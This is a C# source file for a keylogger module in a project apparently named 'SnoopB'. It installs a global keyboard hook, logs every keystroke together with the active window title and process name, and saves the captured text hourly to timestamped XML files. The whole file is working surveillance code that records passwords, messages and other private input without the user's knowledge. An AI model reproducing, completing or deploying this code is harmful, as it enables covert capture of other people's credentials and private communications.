using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using SnoopB.Configuration;
using SnoopB.Modules.CommonHelpers;

namespace SnoopB.Modules.Keylogger
{
    /// <summary>
    /// If is enabled, collect, all keys pressed. The interval is use to flush a xml file to disk
    /// </summary>
    internal class KeyloggerModule : Module
    {
        private readonly Stack _appNames;
        private readonly Hashtable _logData;
        private readonly Hashtable _logDataHour;
        private string _lastNameSaved;

        public KeyloggerModule(int intervalMin) : base(intervalMin)
        {
            try
            {
                var hooker = new UserActivityHook();
                hooker.KeyDown += HookerKeyDown;
                hooker.KeyPress += HookerKeyPress;

                _appNames = new Stack();
                _logData = new Hashtable();
                _logDataHour = new Hashtable();
            }
            catch (Exception)
            {

            }
        }

        #region [ Module ]

        protected override void ExecuteInternal()
        {
            CheckAndSave();
        }

        public new static string ModuleId
        {
            get { return "aad7d27f-c066-45d3-a5d3-6f8cf566c6e4"; }
        }

        #endregion

        private void CheckAndSave()
        {
            if (_lastNameSaved == null)
            {
                //The first time save the name
                _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss") + ".xml";
                SaveLogfile(Path.Combine(Configurator.Instance.CurrentExecutionPath, _lastNameSaved));
            }
            else
            {
                //If we have name, we use it
                SaveLogfile(Path.Combine(Configurator.Instance.CurrentExecutionPath, _lastNameSaved));

                var lastSaveHour = _lastNameSaved.Substring(12, 2);
                if (lastSaveHour != DateTime.Now.Hour.ToString())
                {
                    ClearMemoryCache();
                    _lastNameSaved = DateTime.Now.ToString("dd-MM-yyyy--HH-mm-ss") + ".xml";
                }
            }
        }

        private void HookerKeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyData.ToString() == "Return")
                Logger("[Enter]");
            if (e.KeyData.ToString() == "Escape")
                Logger("[Escape]");
        }

        private void HookerKeyPress(object sender, KeyPressEventArgs e)
        {
            if ((byte) e.KeyChar == 9)
                Logger("[TAB]");
            if ((byte)e.KeyChar == 8)
                Logger("[BackSpace]");
            else if (Char.IsLetterOrDigit(e.KeyChar) || Char.IsPunctuation(e.KeyChar))
                Logger(e.KeyChar.ToString());
            else if (e.KeyChar == 32)
                Logger(" ");
            else if (e.KeyChar != 27 && e.KeyChar != 13) //Escape
                Logger("[Char\\" + ((byte) e.KeyChar) + "]");
        }

        /// <summary>
        /// Log the keys
        /// </summary>
        private void Logger(string txt)
        {
            var p = System.Diagnostics.Process.GetProcessById(WinApi.GetWindowProcessID());
            var _appName = p.ProcessName;
            var _appltitle = WinApi.ActiveApplTitle().Trim().Replace("\0", "");
            var _thisapplication = _appltitle + "######" + _appName;

            if (!_appNames.Contains(_thisapplication))
            {
                _appNames.Push(_thisapplication);
                _logData.Add(_thisapplication, "");
            }

            var en = _logData.GetEnumerator();

            while (en.MoveNext())
            {
                if (en.Key.ToString() == _thisapplication)
                {
                    var prlogdata = en.Value.ToString();

                    _logData.Remove(_thisapplication);
                    _logDataHour.Remove(_thisapplication);

                    _logData.Add(_thisapplication, prlogdata + txt);
                    _logDataHour.Add(_thisapplication, DateTime.Now.ToString("dd-MM-yyyy HH:mm:ss"));
                    break;
                }
            }
        }

        /// <summary>
        /// Save into disk the log file
        /// </summary>
        /// <param name="pathtosave"></param>
        private void SaveLogfile(string pathtosave)
        {
            try
            {
                var writer = new StreamWriter(pathtosave, false);
                var element = _logData.GetEnumerator();
                writer.Write("<?xml version=\"1.0\"?>");
                writer.WriteLine("");
                writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
                writer.WriteLine("");

                writer.Write("<ApplDetails>");
                while (element.MoveNext())
                {
                    writer.Write("<Apps_Log>");

                    writer.Write("<ProcessName>");
                    var processname = "<![CDATA[" + element.Key.ToString().Trim().Substring(0, element.Key.ToString().Trim().LastIndexOf("######")).Trim() + "]]>";
                    processname = processname.Replace("\0", "");
                    writer.Write(processname);
                    writer.Write("</ProcessName>");

                    writer.Write("<ApplicationName>");
                    var applname = "<![CDATA[" + element.Key.ToString().Trim().Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6).Trim() + "]]>";
                    writer.Write(applname);
                    writer.Write("</ApplicationName>");

                    writer.Write("<LogDataHour>");
                    var ldataHour = ("<![CDATA[" + _logDataHour[element.Key] + "]]>").Replace("\0", "");
                    writer.Write(ldataHour);
                    writer.Write("</LogDataHour>");

                    writer.Write("<LogData>");
                    var ldata = ("<![CDATA[" + element.Value + "]]>").Replace("\0", "");
                    writer.Write(ldata);
                    writer.Write("</LogData>");

                    writer.Write("</Apps_Log>");
                }
                writer.Write("</ApplDetails>");

                writer.Flush();
                writer.Close();
            }
            catch (Exception ex)
            {
                Debug.WriteLine(ex.Message, ex.StackTrace);
            }
        }

        private void ClearMemoryCache()
        {
            _logData.Clear();
            _appNames.Clear();
            _logDataHour.Clear();
        }
    }
}